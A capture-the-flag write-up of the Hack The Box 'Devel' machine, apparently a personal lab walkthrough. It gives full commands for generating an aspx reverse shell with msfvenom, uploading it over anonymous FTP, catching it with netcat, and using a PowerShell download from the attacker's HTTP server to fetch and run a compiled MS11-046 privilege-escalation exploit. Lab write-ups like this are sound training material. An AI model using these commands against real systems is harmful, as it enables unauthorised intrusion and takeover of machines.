## Room Information

- Room name: Devel
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Devel

![Untitled](/HTB/devel-icon.png)

## Tools Used

- Nmap
- FTP
- Msfvenom
- Searchsploit

## Port Scanning

```bash
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The scan results shows two open ports, the port 80 has an iis7 web server and the port 21 a ftp service with the content of the website, one folder named aspnet_client gives us a clue of what framework is using the website.

## Enumeration

We can try a reverse shell since it allows us to log in the ftp server anonymously.

First we are going to list the formats we can use with:

```bash
msfvenom --list formats
```

A format specially caught my attention and it’s the aspx format which is used by the [asp.net](http://asp.net) 

We can build the reverse shell with:

```bash
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.20 LPORT=4444 -o reverse-shell.aspx
```

## Exploiting

Let’s exploit the machine

First we are going to connect with the ftp client anonymously with:

```bash
ftp 10.10.10.5 21
```

Once there, let’s send the reverse shell with mput command:

```bash
mput ~/Documents/exploits/reverse-shell.aspx
```

Only left a listener

```bash
nc -lv 4444
```

Now let’s run the file in the browser http://10.10.10.5/reverse-shell.aspx.

## Gaining an Initial Foothold

We are in now. Let’s see if we are root users or not.

If we try to enter in the users folder seems that we don’t have permissions.

## Escalating Privilege

We can list the system information to see if we can escalate privileges.

![Untitled](/HTB/devel-4.png)

Our version is the Windows 7 build 7600 x86, it’s fairly old and no hotfix(s) are applied.

In searchsploit seems doesnt have any result.

![Untitled](/HTB/devel-5.png)

If we google it we can see a [exploit](https://www.exploit-db.com/exploits/40564) that fits well with what we want to do.

![Untitled](/HTB/devel-6.png)

![Untitled](/HTB/devel-7.png)

The exploit CVE-**[2011-1249](https://nvd.nist.gov/vuln/detail/CVE-2011-1249)** help us to escalate privileges.

Let’s download the exploit with searchsploit 

```bash
searchsploit -m "40564"
```

If we take a look to the documentation of the exploit we can see that the exploit need to be compiled with `mingw32` first.

```bash
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
```

Now let’s create a http server with python to send this .exe.

```bash
python -m http.server 80
```

The remote machine doesn’t seems to have netcat but has powershell we can download the file with:

```bash
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.20:80/MS11-046.exe', 'c:\Users\Public\Downloads\40564.exe')"
```

Once we have the exploit only left to run it, we can find it in c:\Users\Public\Downloads

We have gained root access.

## Flag(s)

Let’s navigate to the user and root Desktops where we can find the flags.

**User Flag**

**Root Flag**

## Lessons Learned

- What insights did you gain from the room?
    
    We learned to put a reverse shell via the ftp service as well as escalate privilege with a exploit that take advantage of the afd.sys file.
    
- Were there any novel tools or techniques employed?
    
    We don’t employed any new tools but he know now a new format of reverse shell (aspx) that is employed by Microsoft [asp.net](http://asp.net).
